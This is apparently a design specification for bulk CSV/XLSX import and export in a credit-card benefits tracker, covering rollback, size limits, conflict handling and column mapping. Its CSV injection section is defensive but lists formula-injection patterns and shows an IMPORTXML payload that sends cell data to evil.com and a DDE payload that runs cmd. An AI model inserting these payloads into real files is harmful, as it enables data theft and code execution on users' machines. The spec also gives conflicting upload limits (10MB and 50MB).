# Card Benefits Tracker - CSV/XLSX Import/Export Specification

## Executive Summary

This specification defines comprehensive import and export functionality for the Card Benefits Tracker, enabling users to bulk manage their card and benefit data through CSV and XLSX file formats. The system provides a multi-step wizard for imports with validation and reconciliation, plus flexible export options for data backup and analysis.

**Primary Objectives:**
- Support bulk importing cards and benefits from CSV/XLSX files with comprehensive validation
- Prevent data corruption through a preview-before-commit workflow
- Handle duplicate detection and data conflict resolution
- Provide multiple export views (single card, filtered, all cards)
- Enable efficient data backup and external analysis
- Maintain audit trails for imported data

---

## Functional Requirements

### Import Functionality

#### FR1: Multi-Step Import Wizard
- Users initiate import via dashboard UI
- Step 1: Upload CSV/XLSX file with drag-drop support
- Step 2: Parse and detect column mappings
- Step 3: Validate data and preview records
- Step 4: Review potential duplicates and conflicts
- Step 5: Final confirmation before database commit

#### FR2: File Format Support
- CSV (comma-separated, UTF-8 encoding)
- XLSX (Microsoft Excel format, all sheets processed)
- Auto-detection of format based on file extension

#### FR3: Bulk Card Import
- Import new MasterCard templates to system (admin only)
- Import UserCard instances to player's wallet
- Support for custom names, annual fees, renewal dates
- Automatic benefit cloning from MasterCard template

#### FR4: Bulk Benefit Import
- Add custom benefits not in master catalog
- Override stickerValues per card instance
- Set userDeclaredValues for ROI customization
- Set expiration dates and usage status

#### FR5: Data Validation
- Check for required fields (column presence)
- Validate data types (dates, monetary values, UUIDs)
- Enforce business rules (annual fee non-negative, future renewal dates)
- Detect and report validation errors with row/column references
- Provide clear remediation guidance for each error

#### FR6: Duplicate Detection
- Identify duplicate card additions (same MasterCard for same player)
- Detect duplicate benefit names within same card
- Option to skip, update, or merge duplicate records
- Report duplicates with full record comparison

#### FR7: Data Reconciliation
- Show preview of all records to be imported
- Display conflicts and warnings
- Allow per-record decisions (import, skip, update)
- Show impact on wallet totals and ROI calculations

#### FR8: Error Handling
- Comprehensive error reporting with line numbers
- Categorize errors: critical (blocking), warnings (non-blocking)
- Rollback entire import on critical errors
- Allow retry after fixes

---

## Critical Amendments - QA Issue Resolution

### Amendment #1: Rollback Strategy for Imports

#### Transaction-Based Rollback (CRITICAL)

**Requirement:** All import operations MUST use database transactions with explicit rollback capability.

**Rollback Triggers:**
1. **Critical validation error detected** after partial import
2. **Database constraint violation** during record insertion
3. **Authorization check failure** mid-transaction
4. **User cancellation** before final commit
5. **Duplicate conflict unresolved** (user doesn't select action)

**Rollback Behavior:**
```
BEGIN TRANSACTION
  ├─ Create ImportJob (status: 'Processing')
  ├─ For each valid record:
  │  ├─ Insert UserCard/UserBenefit
  │  ├─ Record in ImportRecord table
  │  └─ Update running totals
  ├─ Check for violations or errors
  └─ IF error detected:
      ROLLBACK
        ├─ Delete all ImportJob changes
        ├─ Delete all UserCard/UserBenefit inserts
        ├─ Delete all ImportRecord entries
        └─ Log rollback reason + time
      Return to user with error message

     ELSE:
      COMMIT
        ├─ Finalize ImportJob (status: 'Committed')
        ├─ Log timestamp
        └─ Return success to user
```

**Orphaned Record Handling:**
If rollback fails (database error during rollback):
1. Mark ImportJob status: 'FAILED_ROLLBACK_REQUIRED'
2. Alert system administrator
3. Provide manual recovery procedure in docs
4. Never allow partial state in database

**Data Preservation During Rollback:**
- ImportJob record preserved (for audit trail)
- ErrorLog preserved with rollback details
- PreviewData NOT deleted (user can retry)
- User can download error report

**Implementation Details:**
```typescript
async function performImportWithRollback(
  importJobId: string,
  recordsToImport: ImportRecord[]
): Promise<{ success: boolean; error?: string }> {
  const transaction = await db.$transaction.begin();

  try {
    // Update ImportJob to Processing
    await transaction.importJob.update({
      where: { id: importJobId },
      data: { status: 'Processing' }
    });

    // Insert all records in transaction
    for (const record of recordsToImport) {
      if (record.recordType === 'Card') {
        await transaction.userCard.create({
          data: { ...record.data, importedFrom: importJobId }
        });
      } else if (record.recordType === 'Benefit') {
        await transaction.userBenefit.create({
          data: { ...record.data, importedFrom: importJobId }
        });
      }
    }

    // Verify data integrity
    const hasErrors = await verifyImportIntegrity(transaction, importJobId);
    if (hasErrors) {
      throw new Error('Data integrity check failed');
    }

    // Commit transaction
    await transaction.$commit();

    // Mark ImportJob as successful
    await db.importJob.update({
      where: { id: importJobId },
      data: {
        status: 'Committed',
        committedAt: new Date()
      }
    });

    return { success: true };

  } catch (error) {
    // Rollback transaction
    try {
      await transaction.$rollback();

      // Log rollback
      await db.importJob.update({
        where: { id: importJobId },
        data: {
          status: 'Failed',
          errorLog: JSON.stringify({
            rollback: true,
            reason: error.message,
            timestamp: new Date()
          })
        }
      });

      return { success: false, error: error.message };

    } catch (rollbackError) {
      // CRITICAL: Rollback itself failed
      await db.importJob.update({
        where: { id: importJobId },
        data: { status: 'FAILED_ROLLBACK_REQUIRED' }
      });

      // Alert monitoring system
      await alertAdministrator('ImportRollbackFailure', {
        importJobId,
        originalError: error.message,
        rollbackError: rollbackError.message
      });

      return {
        success: false,
        error: 'Import failed and rollback could not complete. Administrator notified.'
      };
    }
  }
}
```

---

### Amendment #2: File Size Limits & Validation

#### File Size Specification

**Maximum File Size: 50MB (52,428,800 bytes)**

**Rationale:**
- Fits in typical server memory (1-2 GB allocated)
- Parses in <60 seconds on standard hardware
- Prevents DoS via massive file uploads
- Balances user convenience with safety

**Maximum Records: 50,000 rows**

**Rationale:**
- Most users have <1,000 cards/benefits
- 50K allows for future growth and templates
- Validation time remains <45 seconds

#### Validation Order (CRITICAL)

**File size validation MUST occur BEFORE parsing:**

```
1. Client-side validation:
   ├─ File selected
   ├─ Check extension (.csv or .xlsx)
   ├─ Check file size < 50MB
   ├─ Show error if fails
   └─ IF passes → Upload to server

2. Server-side validation:
   ├─ Verify Content-Length header < 50MB
   ├─ Verify file type (magic bytes, not just extension)
   ├─ IF fails → Reject with 413 Payload Too Large
   └─ IF passes → Begin parsing
```

**Client-Side Size Check:**
```typescript
function validateFileSize(file: File): {
  valid: boolean;
  error?: string;
} {
  const MAX_SIZE_MB = 50;
  const MAX_SIZE_BYTES = MAX_SIZE_MB * 1024 * 1024;

  if (file.size > MAX_SIZE_BYTES) {
    return {
      valid: false,
      error: `File too large: ${(file.size / 1024 / 1024).toFixed(1)}MB. Maximum is ${MAX_SIZE_MB}MB.`
    };
  }

  if (file.size === 0) {
    return {
      valid: false,
      error: 'File is empty. Please select a file with data.'
    };
  }

  return { valid: true };
}
```

**Server-Side File Type Validation (Magic Bytes):**
```typescript
// DO NOT trust file extension alone
async function validateFileType(
  buffer: Buffer,
  filename: string
): Promise<{ valid: boolean; type?: 'CSV' | 'XLSX'; error?: string }> {
  // CSV: Check first few bytes for valid UTF-8
  if (filename.endsWith('.csv')) {
    // CSV has no magic bytes, but should be valid UTF-8
    try {
      const text = buffer.toString('utf-8', 0, Math.min(1024, buffer.length));
      if (text.includes('\n') || text.includes(',')) {
        return { valid: true, type: 'CSV' };
      }
    } catch {
      return { valid: false, error: 'Invalid CSV: not valid UTF-8' };
    }
  }

  // XLSX: Check magic bytes (PK header)
  if (filename.endsWith('.xlsx')) {
    // XLSX is ZIP format, starts with: 50 4B 03 04 (PK in ASCII)
    const isZip =
      buffer[0] === 0x50 &&
      buffer[1] === 0x4b &&
      buffer[2] === 0x03 &&
      buffer[3] === 0x04;

    if (isZip) {
      return { valid: true, type: 'XLSX' };
    }

    return { valid: false, error: 'Invalid XLSX: not a valid ZIP file' };
  }

  return { valid: false, error: 'Unsupported file type. Use .csv or .xlsx' };
}
```

#### Memory-Efficient Parsing

**Streaming Parser for Large Files:**
```typescript
// For files near 50MB, use streaming to avoid loading entire file in memory
async function parseCSVStreaming(
  stream: ReadableStream,
  maxRows: number = 50000
): Promise<{
  headers: string[];
  rows: Record<string, any>[];
  error?: string;
}> {
  const headers: string[] = [];
  const rows: Record<string, any>[] = [];
  let rowCount = 0;

  return new Promise((resolve, reject) => {
    stream
      .pipe(csv())
      .on('headers', (headerList) => {
        headers.push(...headerList);
      })
      .on('data', (row) => {
        if (rowCount >= maxRows) {
          // Stop processing if limit reached
          stream.destroy();
          return;
        }
        rows.push(row);
        rowCount++;
      })
      .on('end', () => {
        if (rowCount >= maxRows) {
          resolve({
            headers,
            rows,
            error: `File contains ${rowCount}+ rows. Limit is ${maxRows}. Process this file in chunks or reduce size.`
          });
        } else {
          resolve({ headers, rows });
        }
      })
      .on('error', (error) => {
        reject(new Error(`CSV parsing failed: ${error.message}`));
      });
  });
}
```

#### User Feedback Messages

**Size Validation Errors:**
```
File too large (100 MB)
→ "Your file is too large (100 MB). Maximum file size is 50 MB.
   Consider splitting your import or deleting unused data."

Empty file
→ "Your file is empty. Please select a file with card data."

Too many records (60,000 rows)
→ "Your file contains 60,000 rows, but the maximum is 50,000.
   Please split into multiple files or remove duplicate/old data."

Invalid format
→ "The file format is not valid CSV or XLSX.
   Please check the file and try again."
```

#### Performance Calculations

**Expected Performance:**
- 1MB file → 1-2 seconds
- 10MB file → 10-15 seconds
- 50MB file → 40-50 seconds

**Timeout Strategy:**
- Set server timeout: 90 seconds
- If parsing exceeds 90 seconds → Return timeout error
- User can retry with smaller file

---

### Amendment #8: Concurrent Update Conflicts

#### Conflict Detection Mechanism

**Timestamp-Based Detection (Optimistic Locking):**

Add to ImportJob and UserCard/UserBenefit:
```
updatedAt: DateTime @updatedAt        // Auto-updated on any change
version: Int @default(1)              // Increment on each update
```

**Conflict Scenario:**
```
User A: Opens card at 10:00 AM (version: 1)
User B: Opens same card at 10:01 AM (version: 1)
User B: Saves manual edit at 10:02 AM (version: 2)
User A: Attempts save at 10:03 AM (still has version: 1)
        → CONFLICT DETECTED
        → System rejects save
        → Shows conflict resolution UI
```

**Implementation:**
```typescript
async function saveCardWithConflictDetection(
  cardId: string,
  updates: Record<string, any>,
  clientVersion: number
): Promise<{ success: boolean; error?: { type: 'CONFLICT'; currentVersion: number } }> {
  // Fetch current version
  const current = await db.userCard.findUnique({ where: { id: cardId } });

  if (current.version !== clientVersion) {
    // Conflict detected!
    return {
      success: false,
      error: {
        type: 'CONFLICT',
        currentVersion: current.version
      }
    };
  }

  // Save with version increment (atomic operation)
  const result = await db.userCard.update({
    where: { id: cardId },
    data: {
      ...updates,
      version: { increment: 1 }  // Atomic increment
    }
  });

  return { success: true };
}
```

#### Conflict Resolution Strategy

**Preference: Last-Write-Wins with User Notification**

When conflict detected:
1. Show user the current data (User B's changes)
2. Show user what they tried to save (User A's changes)
3. Highlight differences
4. Ask user to choose:
   - **Keep current** (discard their changes)
   - **Overwrite current** (apply their changes)
   - **Manual merge** (let them choose field by field)

**UI Example:**
```
CONFLICT DETECTED

Your version (imported at 10:03 AM):
  Annual Fee: $695
  Renewal Date: 2024-05-15

Current version (updated at 10:02 AM):
  Annual Fee: $750
  Renewal Date: 2024-05-20

[Keep Current]  [Overwrite]  [Manual Merge]
```

#### Edge Case: Simultaneous Import + Manual Edit

**Scenario:**
```
10:00 AM - User A starts import (1000 benefits)
10:01 AM - User B manually edits same card
10:02 AM - Import completes for benefits, tries to update card
          → CONFLICT
          → Shows user what happened
          → User chooses resolution
```

**Prevention Strategy:**
Lock card during import:
```typescript
// Set card status to 'IMPORTING' during bulk operation
async function importCardsBulk(records: ImportRecord[]) {
  for (const record of records) {
    const cardId = record.existingCardId;

    // Try to acquire lock
    const locked = await db.userCard.update({
      where: { id: cardId, status: { not: 'IMPORTING' } },
      data: { status: 'IMPORTING' }
    }).catch(() => null);

    if (!locked) {
      // Card is locked by another operation
      throw new Error(`Card is being edited. Please wait and try again.`);
    }

    // Perform import
    // ...

    // Release lock
    await db.userCard.update({
      where: { id: cardId },
      data: { status: 'Active' }
    });
  }
}
```

#### Recovery Strategies

1. **Automatic Retry with Exponential Backoff:**
   - If conflict due to race condition, retry after 100ms
   - Max 3 retries before showing UI

2. **Conflict History:**
   - Track all conflicts in ImportJob.conflictLog
   - User can view resolution history
   - Support undo last resolution (1 level deep)

3. **Admin Override:**
   - System admin can force-apply changes
   - Logs who overrode and why
   - Affects audit trail

---

### Amendment #9: CSV Injection Prevention

#### Input Sanitization (CRITICAL)

**Formula Detection & Escape:**

Dangerous patterns in CSV cells:
```
=SUM(A1:A10)      → Excel formula (can execute macros)
+1+1              → Formula starting with +
-1+1              → Formula starting with -
@SUM(...)         → DDE attack (@)
\cmd.exe           → Command execution
[http://evil.com] → External link
```

**Sanitization Rules:**

1. **Detect formula prefix:**
```typescript
function isFormulaStart(cellValue: string): boolean {
  if (!cellValue || typeof cellValue !== 'string') return false;

  const firstChar = cellValue.trim().charAt(0);
  return ['=', '+', '-', '@', '['].includes(firstChar);
}

function sanitizeCSVCell(cellValue: string): string {
  if (isFormulaStart(cellValue)) {
    // Prepend single quote: Excel treats as text
    return "'" + cellValue;
  }
  return cellValue;
}
```

2. **Apply sanitization on import:**
```typescript
async function parseAndSanitizeCSV(
  csvContent: string
): Promise<Record<string, any>[]> {
  const rows = [];

  // Parse CSV
  const parsed = parseCSV(csvContent);

  // Sanitize each cell
  for (const row of parsed) {
    const sanitized: Record<string, any> = {};

    for (const [key, value] of Object.entries(row)) {
      if (typeof value === 'string') {
        sanitized[key] = sanitizeCSVCell(value);
      } else {
        sanitized[key] = value;
      }
    }

    rows.push(sanitized);
  }

  return rows;
}
```

3. **Apply sanitization on export:**
```typescript
function exportToCSV(data: Record<string, any>[]): string {
  const rows = [getHeaders()];

  for (const record of data) {
    const csvRow: string[] = [];

    for (const value of Object.values(record)) {
      let cell = String(value || '');

      // Sanitize formula patterns
      if (isFormulaStart(cell)) {
        cell = "'" + cell;  // Prefix with quote
      }

      // Escape quotes
      cell = cell.replace(/"/g, '""');

      // Wrap in quotes if contains comma/newline
      if (cell.includes(',') || cell.includes('\n') || cell.includes('"')) {
        cell = `"${cell}"`;
      }

      csvRow.push(cell);
    }

    rows.push(csvRow.join(','));
  }

  return rows.join('\n');
}
```

#### Validation Rules for User Input

**All user-input columns MUST validate:**

```typescript
const VALIDATION_RULES = {
  cardName: {
    maxLength: 100,
    pattern: /^[a-zA-Z0-9\s\-&().']+$/,  // Only allowed chars
    sanitize: true,
    errorMsg: 'Card name contains invalid characters'
  },
  benefitName: {
    maxLength: 150,
    pattern: /^[a-zA-Z0-9\s\-&().']+$/,
    sanitize: true,
    errorMsg: 'Benefit name contains invalid characters'
  },
  customName: {
    maxLength: 100,
    pattern: /^[a-zA-Z0-9\s\-&().']*$/,  // Allow empty
    sanitize: true,
    errorMsg: 'Custom name contains invalid characters'
  },
  notes: {
    maxLength: 500,
    allowNewlines: true,
    sanitize: false,  // Notes can be less restricted
    errorMsg: 'Notes exceed maximum length'
  }
};

async function validateAndSanitizeRow(
  row: Record<string, any>
): Promise<{ valid: boolean; sanitized?: Record<string, any>; errors?: string[] }> {
  const errors: string[] = [];
  const sanitized: Record<string, any> = {};

  for (const [field, value] of Object.entries(row)) {
    const rules = VALIDATION_RULES[field];

    if (!rules) {
      sanitized[field] = value;  // Unknown field, pass through
      continue;
    }

    // Check length
    if (value && typeof value === 'string' && value.length > rules.maxLength) {
      errors.push(`${field}: exceeds max length of ${rules.maxLength}`);
      continue;
    }

    // Check pattern
    if (value && !rules.pattern.test(value)) {
      errors.push(rules.errorMsg);
      continue;
    }

    // Sanitize if needed
    if (rules.sanitize && typeof value === 'string') {
      sanitized[field] = sanitizeCSVCell(value);
    } else {
      sanitized[field] = value;
    }
  }

  return {
    valid: errors.length === 0,
    sanitized: errors.length === 0 ? sanitized : undefined,
    errors: errors.length > 0 ? errors : undefined
  };
}
```

#### Malicious Input Examples & Handling

**Example 1: Formula Injection**
```
Input:  =IMPORTXML("http://evil.com/steal?data="&A1, "//script")
Output: '=IMPORTXML("http://evil.com/steal?data="&A1, "//script")
Result: Excel shows as text, formula doesn't execute
```

**Example 2: DDE Attack**
```
Input:  @SUM(1+1)*cmd|'/c calc'!A1
Output: '@SUM(1+1)*cmd|'/c calc'!A1
Result: Treated as text, no execution
```

**Example 3: XSS via User Input (during export)**
```
Input:  <script>alert('xss')</script>
Output: '&lt;script&gt;alert('xss')&lt;/script&gt;
Result: Escaped in CSV, safe when re-imported
```

---

### Amendment #12: Column Mapping Flexibility

#### User-Driven Column Mapping

**Problem:** Files may have different column orders or custom names
**Solution:** Allow users to map columns to system fields

**Mapping UI Workflow:**

```
Step 2: Column Mapping

Detected headers in your file:
[ Card Name ] [ Issuer ] [ Fee ] [ Renewal ]

System expects:
[ CardName ] [ Issuer ] [ AnnualFee ] [ RenewalDate ]

MAPPING:
┌─────────────────────────────────────────┐
│ Your Column    → Maps To System Field   │
├─────────────────────────────────────────┤
│ Card Name      → [v] CardName           │
│ Issuer         → [v] Issuer             │
│ Fee            → [v] AnnualFee          │
│ Renewal        → [v] RenewalDate        │
│ (unmapped)     → [  ] Status            │
│ (unmapped)     → [  ] CustomName        │
└─────────────────────────────────────────┘

[Auto-map] [Confirm Mapping] [Manual Map All]
```

#### Mapping Detection Algorithm

**Auto-detection Rules (in order of confidence):**

```typescript
function autoDetectColumnMapping(
  headers: string[]
): Map<string, string> {
  const mapping = new Map<string, string>();

  const systemFields = [
    'CardName',
    'Issuer',
    'AnnualFee',
    'RenewalDate',
    'CustomName',
    'Status',
    'BenefitName',
    'BenefitType',
    'StickerValue',
    'DeclaredValue',
    'ExpirationDate',
    'Usage'
  ];

  for (const header of headers) {
    const normalized = header.toLowerCase().trim();

    // 1. Exact match (case-insensitive)
    const exactMatch = systemFields.find(
      (f) => f.toLowerCase() === normalized
    );
    if (exactMatch) {
      mapping.set(header, exactMatch);
      continue;
    }

    // 2. Fuzzy match with common synonyms
    const fuzzyMatches: Record<string, string[]> = {
      'CardName': ['card', 'card name', 'card title', 'name'],
      'Issuer': ['issuer', 'bank', 'company', 'network'],
      'AnnualFee': ['annual fee', 'yearly fee', 'fee', 'annual_fee'],
      'RenewalDate': ['renewal', 'renewal date', 'renews', 'anniversary'],
      'BenefitName': ['benefit', 'benefit name', 'perk', 'feature'],
      'BenefitType': ['type', 'benefit type', 'category'],
      'StickerValue': ['sticker value', 'advertised value', 'value', 'sticker_value'],
      'DeclaredValue': ['declared value', 'personal value', 'your value', 'custom_value'],
      'ExpirationDate': ['expiration', 'expires', 'expiration date', 'exp_date'],
      'Status': ['status', 'state', 'claimed', 'usage'],
      'Usage': ['usage', 'status', 'claimed', 'used']
    };

    for (const [systemField, synonyms] of Object.entries(fuzzyMatches)) {
      if (synonyms.some((syn) => normalized.includes(syn.toLowerCase()))) {
        if (!mapping.has(header)) {
          mapping.set(header, systemField);
          break;
        }
      }
    }
  }

  return mapping;
}
```

**Confidence Scoring:**
```typescript
function scoreMapping(
  userHeader: string,
  systemField: string,
  mappingType: 'exact' | 'fuzzy' | 'manual'
): number {
  const scores = {
    'exact': 1.0,      // 100% confident
    'fuzzy': 0.75,     // 75% confident
    'manual': 1.0      // User chose, 100% confident
  };

  return scores[mappingType];
}

// Show confidence to user:
// "Auto-mapped 'Fee' to 'AnnualFee' (75% confident) ✓"
```

#### Column Mapping Storage

**Store mapping for future imports:**
```
UserImportProfile {
  userId: String
  name: String (e.g., "My standard export format")

  columnMappings: {
    "CardName": "CardName",      // fileColumn → systemField
    "Issuer": "Issuer",
    "Fee": "AnnualFee",
    "Renewal": "RenewalDate"
  }

  lastUsedAt: DateTime
  usageCount: Int
}
```

**Reuse workflow:**
```
User uploads file
  ↓
System detects format (checks previous imports)
  ↓
Found matching profile: "My standard export format (used 5 times)"
  ↓
Show: "Mapping detected from previous import ✓"
  ↓
Auto-apply mapping
  ↓
User can still manually adjust if needed
```

#### Default Column Names & Order

**Standard Export Order (for re-import compatibility):**
```
Cards CSV:
  CardName,Issuer,AnnualFee,RenewalDate,CustomName,Status

Benefits CSV:
  CardName,Issuer,BenefitName,BenefitType,StickerValue,
  DeclaredValue,ExpirationDate,Usage

Combined CSV:
  RecordType,CardName,Issuer,AnnualFee,RenewalDate,CustomName,
  Status,BenefitName,BenefitType,StickerValue,DeclaredValue,
  ExpirationDate,Usage
```

**Custom Column Name Support:**

User can export with custom headers:
```
Original:  CardName, AnnualFee, RenewalDate
Custom:    "Card", "Fee", "Renews on"

Export saved with custom headers
  ↓
User modifies file locally
  ↓
Re-imports file with custom headers
  ↓
System uses mapping profile to translate back
  ↓
Imports with correct fields
```

#### Column Suggestion Algorithm

**Smart column matching:**

```typescript
function suggestSystemField(
  userColumnName: string,
  previousMappings?: Map<string, string>
): { field: string; confidence: number }[] {
  const suggestions: { field: string; confidence: number }[] = [];

  // 1. Check if user previously mapped this exact column
  if (previousMappings?.has(userColumnName)) {
    suggestions.push({
      field: previousMappings.get(userColumnName)!,
      confidence: 0.95
    });
  }

  // 2. Check common patterns
  const patterns = [
    { regex: /card\s*name/i, field: 'CardName', conf: 0.9 },
    { regex: /issuer|bank|company/i, field: 'Issuer', conf: 0.85 },
    { regex: /annual\s*fee|yearly\s*fee|fee/i, field: 'AnnualFee', conf: 0.8 },
    { regex: /renewal|renews|anniversary/i, field: 'RenewalDate', conf: 0.85 },
    { regex: /benefit\s*name|perk/i, field: 'BenefitName', conf: 0.85 },
    { regex: /sticker\s*value|advertised|value/i, field: 'StickerValue', conf: 0.8 },
  ];

  for (const pattern of patterns) {
    if (pattern.regex.test(userColumnName)) {
      suggestions.push({
        field: pattern.field,
        confidence: pattern.conf
      });
    }
  }

  // Sort by confidence
  return suggestions.sort((a, b) => b.confidence - a.confidence);
}
```

---

### Export Amendments

**Updated FR13: Round-Trip Compatibility**

Specify exactly what's preserved:

**Fields included in export (preserving data for re-import):**
- ✓ CardName, Issuer (unique identifiers)
- ✓ AnnualFee, RenewalDate (user customizations)
- ✓ CustomName (user notes)
- ✓ BenefitName, BenefitType (benefit definitions)
- ✓ StickerValue (master template value)
- ✓ DeclaredValue (user customizations)
- ✓ ExpirationDate (benefit lifecycle)
- ✓ Usage (Claimed/Unused state)

**Fields NOT included (system-generated, don't re-import):**
- ✗ UserCard.id, UserBenefit.id (new records get new IDs)
- ✗ createdAt, updatedAt (use current timestamp on re-import)
- ✗ ROI calculations (recalculated on import)
- ✗ importedFrom, importedAt (new import, new metadata)

**Timestamp handling on re-import:**
- IF card exists (duplicate detected): preserve createdAt
- IF card is new: set createdAt to import time
- ALWAYS update updatedAt to import time

---

### Amended Implementation Task List

**Phase 1 updates:**
- Task 1.1: Implement transaction-based import (6-8 hours)
- Task 1.2: Add file size validation + streaming parser (4-5 hours)
- Task 1.3: Implement column mapping auto-detection (3-4 hours)
- Task 1.4: Build validation framework with sanitization (4-5 hours)

**Phase 2 updates:**
- Task 2.1: Build rollback handling UI (2-3 hours)
- Task 2.2: Implement conflict detection + resolution UI (4-5 hours)
- Task 2.3: Create duplicate handling workflow (3-4 hours)

**Phase 3 updates:**
- Task 3.1: Implement CSV injection prevention (2-3 hours)
- Task 3.2: Build export with round-trip support (4-5 hours)

**Phase 4 updates:**
- Task 4.1: Test rollback scenarios (4-5 hours)
- Task 4.2: Test concurrent imports/edits (3-4 hours)
- Task 4.3: Test with malicious CSV files (3-4 hours)
- Task 4.4: Performance testing with 50MB file (3-4 hours)

---

### Export Functionality

#### FR9: Export Scope Options
- Single card with all its benefits
- All cards for a player
- Filtered view (by benefit type, usage status, date range)
- Entire wallet across all players

#### FR10: Export Format Options
- CSV with standard column structure
- XLSX with multiple sheets (summary, cards, benefits)
- Custom column selection
- Include/exclude system-generated fields (IDs, timestamps)

#### FR11: Export Contents
- Card: name, issuer, annual fee, renewal date, status
- Benefit: name, type, sticker value, declared value, expiration, status
- Calculated: ROI per card, total annual value
- Metadata: export timestamp, card member year

#### FR12: File Organization
- Descriptive filenames with date stamps
- Option to include multiple cards in single export
- Sheet organization in XLSX (summary, details, calculations)

#### FR13: Data Integrity
- Preserve all user customizations and overrides
- Include audit trail (created/updated dates)
- Support re-import without data loss
- Round-trip compatibility (export then import yields same state)

---

## Implementation Phases

### Phase 1: Import Foundation (Days 1-2)
**Objectives:** Build core import infrastructure and validation
- Create import data structures and schemas
- Implement file parsing (CSV/XLSX)
- Build validation framework and rules engine
- Create import preview UI
- Estimated Scope: Medium (8-10 hours)

### Phase 2: Import Workflow (Days 3-4)
**Objectives:** Complete multi-step wizard and conflict resolution
- Build import wizard UI (5-step flow)
- Implement duplicate detection and reconciliation UI
- Create confirmation and rollback mechanisms
- Write comprehensive tests (80%+ coverage)
- Estimated Scope: Large (12-15 hours)

### Phase 3: Export Implementation (Days 5-6)
**Objectives:** Implement flexible export with multiple formats
- Build export service and format generators
- Create export options UI
- Implement CSV and XLSX generation
- Add export history and audit trail
- Estimated Scope: Medium (10-12 hours)

### Phase 4: Polish & Testing (Days 7-8)
**Objectives:** Performance optimization and comprehensive testing
- End-to-end testing of import/export workflows
- Performance testing with large files (10K+ records)
- Security and authorization testing
- Edge case handling and error scenarios
- Estimated Scope: Medium (8-10 hours)

**Phase Dependencies:**
- Phase 1 → Phase 2 (requires import foundation)
- Phase 1 → Phase 3 (foundation used for export)
- Phases 2 & 3 can proceed in parallel

---

## Data Schema / State Management

### New Database Tables

#### ImportJob (Track import operations for audit trail)
```
ImportJob {
  id: String @id @default(cuid())                    // Unique import identifier
  playerId: String                                   // Which player's wallet
  userId: String                                     // Who initiated

  fileName: String                                   // Original filename
  fileFormat: 'CSV' | 'XLSX'                         // File type
  fileSize: Int                                      // Bytes

  status: 'Uploaded' | 'Parsing' | 'Validating' | 'PreviewReady' | 'Committed' | 'Failed'
  totalRecords: Int                                  // Total rows in file
  processedRecords: Int                              // Successfully imported
  skippedRecords: Int                                // Duplicate/conflict skips
  failedRecords: Int                                 // Validation failures

  importType: 'Cards' | 'Benefits' | 'Mixed'        // What was imported

  errorLog: String?                                  // JSON array of errors
  previewData: String?                               // JSON preview before commit

  createdAt: DateTime @default(now())
  committedAt: DateTime?                             // Null until committed

  // Relationships
  player: Player @relation(fields: [playerId], references: [id], onDelete: Cascade)
  user: User @relation(fields: [userId], references: [id], onDelete: Cascade)

  @@index([playerId])
  @@index([status])
  @@index([createdAt])
}

ImportRecord {
  id: String @id @default(cuid())
  importJobId: String

  recordType: 'Card' | 'Benefit'                     // What type of record
  rowNumber: Int                                     // Line in original file

  data: String                                       // Original row data (JSON)

  status: 'Valid' | 'Duplicate' | 'Conflict' | 'Error'
  errorDetails: String?                              // Validation error messages

  createdCardId: String?                             // ID if card was created
  createdBenefitId: String?                          // ID if benefit was created

  // Relationships
  importJob: ImportJob @relation(fields: [importJobId], references: [id], onDelete: Cascade)

  @@index([importJobId])
  @@index([status])
}
```

### Schema Changes to Existing Tables

#### UserCard
```
ADD COLUMN importedFrom: String?                     // ImportJob ID for audit
ADD COLUMN importedAt: DateTime?                     // When imported via bulk operation
```

#### UserBenefit
```
ADD COLUMN importedFrom: String?                     // ImportJob ID for audit
ADD COLUMN importedAt: DateTime?                     // When imported via bulk operation
```

### CSV Format Specification

#### Cards CSV Header
```
CardName,Issuer,AnnualFee,RenewalDate,CustomName,Status
"Chase Sapphire Reserve","Chase",550,"2024-12-31","My Amex",Active
"American Express Gold","Amex",250,"2025-06-15","",Active
```

**Fields:**
- `CardName`: Required. Must match existing MasterCard.cardName
- `Issuer`: Required. Must match existing MasterCard.issuer
- `AnnualFee`: Optional. Numeric cents (e.g., 55000 = $550). If omitted, uses default
- `RenewalDate`: Required. ISO 8601 format (YYYY-MM-DD). Must be future date
- `CustomName`: Optional. User's custom nickname for card
- `Status`: Optional. 'Active' or 'Inactive'. Defaults to 'Active'

#### Benefits CSV Header
```
CardName,BenefitName,BenefitType,StickerValue,DeclaredValue,ExpirationDate,Usage
"Chase Sapphire Reserve","Travel Credit","StatementCredit",300,300,"2024-12-31",Claimed
"Chase Sapphire Reserve","Dining Credit","StatementCredit",100,80,"2024-12-31",Unused
```

**Fields:**
- `CardName`: Required. Links benefit to card (via CardName + Issuer)
- `BenefitName`: Required. Name of benefit
- `BenefitType`: Required. 'StatementCredit' or 'UsagePerk'
- `StickerValue`: Required. Numeric cents (e.g., 30000 = $300)
- `DeclaredValue`: Optional. User's personal valuation. Null = use sticker value
- `ExpirationDate`: Optional. ISO 8601 format. Auto-calculated if omitted
- `Usage`: Optional. 'Claimed' or 'Unused'. Defaults to 'Unused'

#### Combined CSV Header
```
RecordType,CardName,Issuer,AnnualFee,RenewalDate,CustomName,Status,BenefitName,BenefitType,StickerValue,DeclaredValue,ExpirationDate,Usage
Card,"Chase Sapphire Reserve","Chase",550,"2024-12-31","",Active,,,,,
Benefit,"Chase Sapphire Reserve","Chase",,,,"",Travel Credit,StatementCredit,300,300,"2024-12-31",Claimed
```

### XLSX Format Specification

**Multi-sheet structure:**
1. **Sheet 1: Summary**
   - Metadata about import (file info, totals, warnings)
   - Sample rows showing expected format
   - Instructions for valid values

2. **Sheet 2: Cards**
   - Header row with column names
   - Card records (one per row)
   - Auto-width columns for readability

3. **Sheet 3: Benefits**
   - Header row with column names
   - Benefit records (one per row)
   - Links benefits to cards via CardName + Issuer

**Cell validation (optional, helpful for users):**
- RenewalDate cells: date format, future dates only
- AnnualFee cells: numeric format, non-negative
- StickerValue: numeric format, positive
- BenefitType: dropdown list (StatementCredit, UsagePerk)
- Status: dropdown list (Active, Inactive)

---

## User Flows & Workflows

### Import Flow (Happy Path)

```
1. User clicks "Import" button on dashboard
   ↓
2. Upload modal opens with drag-drop zone
   - User drags CSV/XLSX file to zone OR clicks to browse
   - File validation: type check, size check (max 10MB)
   - Success: advance to step 2
   ↓
3. Parse & Preview step
   - System reads file, detects format (CSV/XLSX)
   - Extracts column headers
   - Shows sample rows (first 5 records)
   - User confirms column mapping is correct
   - If mapping wrong: allow manual column selection
   ↓
4. Validation step
   - System validates all records against schema
   - Reports errors with row/column references
   - Categorizes as critical (blocking) or warning (non-blocking)
   - User sees: X valid, Y warnings, Z errors
   - If critical errors: must fix and re-upload
   - If only warnings: can proceed
   ↓
